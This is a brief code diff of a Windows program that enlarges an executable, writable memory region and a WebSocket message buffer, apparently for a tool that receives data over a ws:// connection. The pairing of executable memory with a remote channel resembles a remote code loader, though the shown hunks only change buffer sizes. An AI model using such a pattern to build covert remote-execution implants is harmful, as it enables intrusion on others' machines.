@@ -36,7 +36,7 @@ int WINAPI WinMain(
     (void)hPrevInstance;
     (void)lpCmdLine;
     (void)nCmdShow;
-    PVOID mem = getMem(0x10000, PAGE_EXECUTE_READWRITE);
+    PVOID mem = getMem(0x100000, PAGE_EXECUTE_READWRITE);
     scratchpad = getMem(0x100000, PAGE_READWRITE);
 
     char host[256] = "ws://";
@@ -64,7 +64,7 @@ int WINAPI WinMain(
     if (!connectWebSocket(client, path)) {
         return 1;
     }
-    size_t MESSAGE_BUFFER_SIZE = 0x10000;
+    size_t MESSAGE_BUFFER_SIZE = 0x100000;
     size_t RESPONSE_BUFFER_SIZE = 0x100000;
     char *messageBuffer = new char[MESSAGE_BUFFER_SIZE];
     char *responseBuffer = new char[RESPONSE_BUFFER_SIZE];
